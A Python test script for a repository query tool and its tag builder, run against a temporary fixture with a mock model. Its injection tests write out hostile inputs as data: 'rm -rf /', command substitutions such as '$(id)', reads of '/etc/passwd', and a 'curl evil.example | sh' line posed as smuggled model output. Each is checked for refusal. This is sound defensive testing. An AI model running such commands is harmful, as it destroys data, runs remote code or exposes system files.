#!/usr/bin/env python3
"""Tests of core/ontology/ask.py (and build_tags.py). Script: prints PASS or FAIL per case, exits 1 on any FAIL.
  python3 -I core/ontology/test_ask.py
The cases run against a small fixture ROOT built in a temporary folder. Two cases run against the real repo
to show that a query changes no file there. The model (stage 2) is replaced by a mock generator; no model runs."""
import hashlib, json, os, subprocess, sys, tempfile

sys.dont_write_bytecode = True
HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, HERE)
import ask

fails = []
def want(name, cond, show=""):
    print(("PASS " if cond else "FAIL ") + name)
    if not cond:
        fails.append(name)
        if show: print("     got:", str(show)[:600])

CULTURE_MD = """# t
## Table 1. Readings

| corpus | work or idea | reading | tags | label in the repo | file |
|---|---|---|---|---|---|
| carseat | Twin Fantasy | a self-map | self-map-vs-other-map, two-versions | analogy | culture/carseat/BASE.md |
| carseat | Lineage | a tree | branching-tree | open | culture/carseat/level.json |
| beauvoir | Freedom needs the other | seriality of worlds | seriality (new), branching-tree | analogy; Kripke fact checked-finite | frames_sync.ath |
| essays | Mirror | one way | (none fits) | open | culture/essays/k.md |

## Table 2. Tag use

| tag | corpora | count |
|---|---|---|
| branching-tree | x | 2 |
"""
PILLAR_MD = """# t
## Table 1: results

| pillar | result | tags | label | file |
|---|---|---|---|---|
| physics | Time is a DAG with one root | branching-tree, exhaustive-check | checked-finite | physics/time/BASE.md |
| physics | Which measure is right | ordering-dependence | open | physics/cosmos/BASE.md |
| math | Parses are Catalan | exhaustive-check | checked | math/language/BASE.md |

## Table 2: tag usage

| tag | pillars | count |
|---|---|---|
"""
FINDINGS = [
    {"kind": "finding", "program": "brain", "id": "f1", "word": "checked", "why_not": [], "text": "Time is a coordinate in relativity."},
    {"kind": "finding", "program": "brain", "id": "f2", "word": "checked", "why_not": ["one seat only"], "text": "A claim with a recorded gap about asymmetry."},
    {"kind": "finding", "program": "math", "id": "f3", "word": "checked-finite", "why_not": [], "text": "Catalan parses up to n=8."},
    {"kind": "finding", "program": "math", "id": "f4", "word": "tested", "why_not": ["sampled"], "text": "A sampled claim about asymmetry."},
    {"kind": "finding", "program": "math", "id": "f5", "word": "open", "why_not": [], "text": "Open question."},
    {"kind": "finding", "program": "math", "id": "f6", "word": "refuted", "why_not": [], "text": "A refuted claim."},
    {"kind": "cell", "program": "math", "id": "c1", "state": "OPEN", "text": "a cell about asymmetry that is not a finding"},
]
FRAMES = [
    {"source": "Time as a social construct", "reading": "time is a coordinate", "claim": "none", "label": "open", "score": 0.002, "status": "OPEN"},
    {"source": "Bridges", "reading": "weak ties are bridges", "claim": "frames.ath:3", "label": "checked-finite", "score": 0.0125, "status": "TRUE"},
    {"source": "Mirror", "reading": "a self map", "claim": "none", "label": "open", "score": 0.004, "status": "OPEN"},
]

def make_fixture(d):
    os.makedirs(os.path.join(d, "center", "shards")); os.makedirs(os.path.join(d, "core", "ontology", "tags"))
    with open(os.path.join(d, "center", "shards", "a.jsonl"), "w") as fh:
        for r in FINDINGS: fh.write(json.dumps(r) + "\n")
    with open(os.path.join(d, "frames.jsonl"), "w") as fh:
        for r in FRAMES: fh.write(json.dumps(r) + "\n")
    c, p = os.path.join(d, "c.md"), os.path.join(d, "p.md")
    open(c, "w").write(CULTURE_MD); open(p, "w").write(PILLAR_MD)
    r = subprocess.run([sys.executable, "-I", os.path.join(HERE, "tags", "build_tags.py"), "--culture", c, "--pillar", p,
                        "--out", os.path.join(d, "core", "ontology", "tags")], capture_output=True, text=True)
    os.remove(c); os.remove(p)
    open(os.path.join(d, "core", "ontology", "DEFS.md"), "w").write("# defs\n- **branching-tree**: a history that splits and never rejoins\n")
    return r

def snap(d):
    out = {}
    for base, dirs, files in os.walk(d):
        for f in files:
            p = os.path.join(base, f); out[p] = hashlib.sha256(open(p, "rb").read()).hexdigest()
    return out

def ans(q, root): return ask.answer(q, root)
def labels_ok(text):
    """every non-grammar answer line starts with a bracketed label"""
    return all(l.startswith("[") for l in text.splitlines() if l.strip())

with tempfile.TemporaryDirectory() as fx:
    b = make_fixture(fx)
    want("build_tags writes both files (3 rows culture parse: 4 culture, 3 formal)",
         b.returncode == 0 and "4 rows" in b.stdout and "3 rows" in b.stdout, b.stdout + b.stderr)
    tc = json.load(open(os.path.join(fx, "core", "ontology", "tags", "tags_culture.json")))
    want("tag JSON carries the status 'proposed tags, unreviewed' and the unadopted new tags",
         tc["status"] == "proposed tags, unreviewed" and [t["tag"] for t in tc["proposed_vocabulary"]["tags"]] == ["diagonal", "min-cut", "seriality"]
         and "not adopted" in tc["proposed_vocabulary"]["status"])
    want("'seriality (new)' is kept out of tags, in new_tags_proposed",
         [r for r in tc["rows"] if r["corpus"] == "beauvoir"][0]["tags"] == ["branching-tree"]
         and [r for r in tc["rows"] if r["corpus"] == "beauvoir"][0]["new_tags_proposed"] == ["seriality"])
    want("row label word: 'analogy; Kripke fact checked-finite' is analogy", [r for r in tc["rows"] if r["corpus"] == "beauvoir"][0]["label_word"] == "analogy")
    before = snap(fx)

    code, t = ans("status", fx)
    want("status: exit 0, counts per word, labelled lines", code == 0 and "[checked] 2 findings recorded as checked, 1 verified" in t and labels_ok(t), t)
    code, t = ans("how many results are verified", fx)
    want("verified: 2 of 6 (checked f1 and checked-finite f3; f2 has a why_not)", code == 0 and "[checked] 2 of 6 results are verified" in t and "checked with why_not 1" in t, t)
    code, t = ans("show open frames", fx)
    want("open frames: only the 2 OPEN ones, highest score first", code == 0 and "2 open frames" in t and "Bridges" not in t and t.index("Mirror") < t.index("Time as"), t)
    code, t = ans("show open frames about time", fx)
    want("open frames about WORD", code == 0 and "1 open frames about time" in t and "Mirror" not in t, t)
    code, t = ans("show frames", fx)
    want("show frames lists all 3, TRUE one labelled checked-finite", code == 0 and "3 frames" in t and "[checked-finite] frame TRUE: Bridges" in t, t)
    code, t = ans("Please SHOW the frames about BRIDGES?", fx)
    want("case and filler words ignored", code == 0 and "1 frames about bridges" in t, t)
    code, t = ans("which results use exhaustive-check", fx)
    want("results by formal tag: 2 rows, both [proposed]", code == 0 and "2 result rows carry the tag exhaustive-check" in t and labels_ok(t)
         and all(l.startswith("[proposed]") for l in t.splitlines()), t)
    code, t = ans("which works use branching-tree", fx)
    want("works by culture tag: 2 rows incl. beauvoir", code == 0 and "2 work rows" in t and "beauvoir" in t, t)
    code, t = ans("what links beauvoir and physics", fx)
    want("links: shared tag branching-tree, rows from both sides", code == 0 and "share 1 tags: branching-tree" in t and "work beauvoir" in t and "result physics" in t, t)
    code, t = ans("what links carseat and math", fx)
    want("links: no shared tag is said plainly", code == 0 and "share no tag" in t, t)
    code, t = ans("what links nobody and physics", fx)
    want("links: unknown corpus is named, not guessed", code == 0 and "no culture corpus named nobody" in t and "carseat" in t, t)
    code, t = ans("list tags", fx)
    want("list tags: includes branching-tree and the unadopted new tag marked", code == 0 and "branching-tree: 2 culture rows, 1 formal rows" in t and "seriality" in t and "new tag, not adopted" in t, t)
    code, t = ans("list corpora", fx)
    want("list corpora", code == 0 and "3 corpora" in t and "carseat: 2 rows" in t, t)
    code, t = ans("list pillars", fx)
    want("list pillars", code == 0 and "2 pillars" in t and "physics: 2 rows" in t, t)
    code, t = ans("what is branching-tree", fx)
    want("what is TAG: definition from the ontology doc, labelled proposed", code == 0 and "a history that splits and never rejoins" in t and "DEFS.md" in t and t.startswith("[proposed]"), t)
    code, t = ans("what is seriality", fx)
    want("what is TAG: unadopted tag uses the proposed definition and says not adopted", code == 0 and "every world reaches some world" in t and "not adopted" in t, t)
    code, t = ans("what is two-versions", fx)
    want("what is TAG without a definition: says so, lists rows", code == 0 and "no definition on record" in t and "Twin Fantasy" in t, t)
    code, t = ans("what is branching-tre", fx)
    want("unknown tag: closest tag named, exit 0, no row invented", code == 0 and "closest: branching-tree" in t and "rows carry" not in t, t)
    code, t = ans("explain asymmetry", fx)
    want("explain: 2 findings (f2 labelled open as unverified, f4 tested) and no cell", code == 0 and "2 findings and 0 frames" in t and "[open] finding brain/f2" in t and "[tested] finding math/f4" in t and "cell" not in t, t)
    code, t = ans("explain time", fx)
    want("explain: finds a finding and a frame", code == 0 and "1 findings and 1 frames" in t and "[checked] finding brain/f1" in t and "[open] frame OPEN: Time as" in t, t)

    code, t = ans("which results use exhaustive-check", fx)
    want("label preservation: a proposed-tag row whose result is checked never prints as [checked]",
         not any(l.startswith("[checked") for l in t.splitlines()) and "row label: checked;" in t and "row label: checked-finite;" in t, t)
    code, t = ans("explain asymmetry", fx)
    want("label preservation: a finding recorded checked but with why_not never prints as [checked]", "[checked] finding brain/f2" not in t and "recorded as checked, not verified" in t, t)

    bad = ["", "   ", "tell me everything", "shw frames", "show frames about", "show frames about two words",
           "which results use", "what links beauvoir", "list everything", "explain", "status; rm -rf /"]
    want("unparseable queries: exit 2, 'did not understand', grammar, a closest-match line",
         all(ans(q, fx)[0] == 2 and "did not understand" in ans(q, fx)[1] and "Grammar" in ans(q, fx)[1] and "closest match:" in ans(q, fx)[1] for q in bad))
    code, t = ans("shw frames", fx)
    want("closest match is a real query", "closest match: show frames" in t, t)
    inj = ["show frames about $(touch /tmp/ask_pwned)", "show frames about `id`", "show frames about ;ls", "show frames about a|b", "show frames about x&&y",
           "explain a>b", "which results use \"x\"", "explain \x00", "show frames about ${HOME}"]
    r = [ans(q, fx) for q in inj]
    want("injection: shell metacharacters are refused (exit 2) and nothing runs", all(c == 2 for c, _ in r) and not os.path.exists("/tmp/ask_pwned"), r)
    rx = [".*", "(", "[a-", "a+", "(?i)x", "\\", "^$", "a{1,}", "x**"]
    r = [(q, ans("explain " + q, fx)) for q in rx] + [(q, ans("which results use " + q, fx)) for q in rx]
    want("injection: regex metacharacters are refused or matched as plain text, never as a pattern, no crash",
         all(c in (0, 2) for _, (c, _) in r) and not any("findings and" in t and "0 findings and 0" not in t for _, (c, t) in r if c == 0), r)
    code, t = ans("explain .*", fx)
    want("regex .* is not a wildcard (refused)", code == 2, t)
    pth = ["explain /etc/passwd", "explain ../../etc/passwd", "show frames about ~/x", "explain C:\\Windows", "explain file:///etc/passwd", "which results use ../tags"]
    r = [ans(q, fx) for q in pth]
    want("path-like words are refused; no path is taken from a query", all(c == 2 for c, _ in r) and not any("root:" in t for _, t in r), r)
    code, t = ans("explain " + "a" * 5000, fx)
    want("very long input: refused with exit 2, quickly", code == 2 and "too long" in t and len(t) < 3000, t[:200])
    code, t = ans("show frames about " + "x" * 250, fx)
    want("a long word under the limit is just no match", code == 0 and "no frames about" in t, t[:200])
    code, t = ans(None, fx)
    want("a non-string query does not crash", code == 2, t)
    want("running every query above changed no file in the fixture", snap(fx) == before)

    env = dict(os.environ, ASK_ROOT=fx)
    r = subprocess.run([sys.executable, "-I", os.path.join(HERE, "ask.py"), "show", "frames", "about", "time"], capture_output=True, text=True, env=env)
    want("CLI: words on the command line, ASK_ROOT honoured, exit 0", r.returncode == 0 and "1 frames about time" in r.stdout, r.stdout + r.stderr)
    r = subprocess.run([sys.executable, "-I", os.path.join(HERE, "ask.py"), "nonsense", "here"], capture_output=True, text=True, env=env)
    want("CLI: unparseable gives exit code 2", r.returncode == 2 and "did not understand" in r.stdout, r.stdout)
    r = subprocess.run([sys.executable, "-I", os.path.join(HERE, "ask.py"), "show frames about $(id)"], capture_output=True, text=True, env=env)
    want("CLI: one quoted argument with a shell word is data, refused", r.returncode == 2 and "uid=" not in r.stdout, r.stdout)
    want("CLI runs changed no file in the fixture", snap(fx) == before)

    # ---- the same build is reproducible
    d2 = tempfile.mkdtemp()
    c2, p2 = os.path.join(d2, "c.md"), os.path.join(d2, "p.md"); open(c2, "w").write(CULTURE_MD); open(p2, "w").write(PILLAR_MD)
    for k in (1, 2):
        subprocess.run([sys.executable, "-I", os.path.join(HERE, "tags", "build_tags.py"), "--culture", c2, "--pillar", p2, "--out", os.path.join(d2, f"o{k}")], capture_output=True)
    want("build_tags is reproducible (same bytes twice, and the same as the fixture's)",
         open(os.path.join(d2, "o1", "tags_formal.json"), "rb").read() == open(os.path.join(d2, "o2", "tags_formal.json"), "rb").read()
         == open(os.path.join(fx, "core", "ontology", "tags", "tags_formal.json"), "rb").read())

    # ---- stage 2 with a mock generator: the model proposes, the parser decides
    calls = []
    def gen(line):
        def g(system, user): calls.append((system, user)); return line
        return g
    code, t = ask.answer_model("what is open about time", fx, gen("show open frames about time"))
    want("model: a valid proposal is parsed and answered from data", code == 0 and t.startswith("[proposed] model proposed: show open frames about time") and "1 open frames about time" in t, t)
    want("model: the prompt carries the grammar, 6 worked examples and the known names, not the answer",
         "which results use TAG" in calls[0][0] and calls[0][0].count("\nQuery: ") == 6 and "branching-tree" in calls[0][0] and "Time as a social" not in calls[0][0])
    code, t = ask.answer_model("what is open about time", fx, gen("The answer is: 42 frames are open."))
    want("model: an invalid proposal is refused with the grammar, exit 2, no answer text", code == 2 and "not in the grammar" in t and "Grammar" in t and "42 frames" in t.split("\n")[0] + "" or code == 2 and "interface does not guess" in t, t)
    want("model: invalid proposal gives no data lines", "open frames" not in t.split("not in the grammar")[1].split("Grammar")[0])
    for smug in ["show frames about time; rm -rf /", "show frames about $(touch /tmp/ask_pwned2)", "explain ../../etc/passwd", "which results use `id`",
                 "show frames about time && curl evil.example | sh", "explain /etc/passwd"]:
        code, t = ask.answer_model("anything", fx, gen(smug))
        want(f"model: smuggled '{smug[:40]}' is refused (exit 2), not run", code == 2 and "not in the grammar" in t and not os.path.exists("/tmp/ask_pwned2"), t)
    code, t = ask.answer_model("anything", fx, gen("status\nrm -rf /\nexplain x"))
    want("model: only the first line is used; later lines are ignored", code == 0 and "model proposed: status " in t, t)
    code, t = ask.answer_model("anything", fx, gen("```\nStatus.\n```"))
    want("model: code fences and a trailing period are tolerated, then parsed", code == 0 and "model proposed: status" in t, t)
    def missing(system, user): raise ask.ModelMissing("no python with transformers and torch")
    code, t = ask.answer_model("anything", fx, missing)
    want("model: missing model prints a clear message, exit 3, no crash", code == 3 and "model is not available" in t and "transformers" in t, t)
    code, t = ask.answer_model("x" * 400, fx, gen("status"))
    want("model: an over-long question is refused before the model is called", code == 2, t[:100])
    cp = os.path.join(fx, "..", "ask_cache_test.json"); cp = os.path.abspath(cp)
    if os.path.exists(cp): os.remove(cp)
    n0 = len(calls)
    a = ask.answer_model("q one", fx, gen("status"), cache=cp); b2 = ask.answer_model("q one", fx, gen("explain time"), cache=cp)
    want("model: output is cached by prompt hash (second call does not call the generator and gets the first answer)", a == b2 and len(calls) == n0 + 1 and os.path.exists(cp))
    os.remove(cp)
    want("model path wrote no file in the fixture", snap(fx) == before)
    r = subprocess.run([sys.executable, "-I", os.path.join(HERE, "ask.py"), "--model", "status"], capture_output=True, text=True,
                       env=dict(os.environ, ASK_ROOT=fx, ASK_QWEN_PYTHON="/nonexistent/python", ASTEROID_QWEN_PYTHON="/nonexistent/python", ASK_CACHE=os.path.join(fx, "..", "cli_cache.json"), PATH="/nonexistent"))
    want("CLI --model with no usable model python: exit 3 or a clear message (never a traceback)", "Traceback" not in r.stderr and r.returncode in (0, 3), r.stdout + r.stderr)
    for f in ("cli_cache.json",):
        pp = os.path.abspath(os.path.join(fx, "..", f))
        if os.path.exists(pp): os.remove(pp)

# ---- the real repo: a query changes no file there
def git_state():
    r = subprocess.run(["git", "status", "--porcelain", "--ignored"], cwd=REPO, capture_output=True, text=True)
    return r.stdout
def tree_stat():
    out = {}
    for sub in ("core", "center", "asteroid"):
        for base, dirs, files in os.walk(os.path.join(REPO, sub)):
            dirs[:] = [x for x in dirs if x != "__pycache__"]
            for f in files:
                p = os.path.join(base, f)
                try: s = os.stat(p); out[p] = (s.st_size, s.st_mtime_ns)
                except OSError: pass
    for f in ("frames.jsonl", "RESULTS.md"):
        s = os.stat(os.path.join(REPO, f)); out[f] = (s.st_size, s.st_mtime_ns)
    return out
g0, s0 = git_state(), tree_stat()
env = {k: v for k, v in os.environ.items() if k != "ASK_ROOT"}
outs = []
for q in ["status", "how many results are verified", "show open frames", "show frames about time", "which results use exhaustive-check",
          "which works use branching-tree", "what links beauvoir and physics", "list tags", "list corpora", "list pillars", "what is fixed-point", "explain time", "nonsense"]:
    r = subprocess.run([sys.executable, "-I", os.path.join(HERE, "ask.py")] + q.split(), capture_output=True, text=True, env=env, cwd=REPO)
    outs.append((q, r.returncode, "Traceback" in r.stderr))
want("real repo: 13 queries ran, exit 0 except the nonsense one (2), no traceback",
     all(rc == (2 if q == "nonsense" else 0) and not tb for q, rc, tb in outs), outs)
want("real repo: git status (with ignored files) is the same before and after", git_state() == g0)
want("real repo: no file under core, center, asteroid, nor frames.jsonl, changed (size and mtime)", tree_stat() == s0)

print(f"\n{len(fails)} failed" if fails else "\nall passed")
sys.exit(1 if fails else 0)
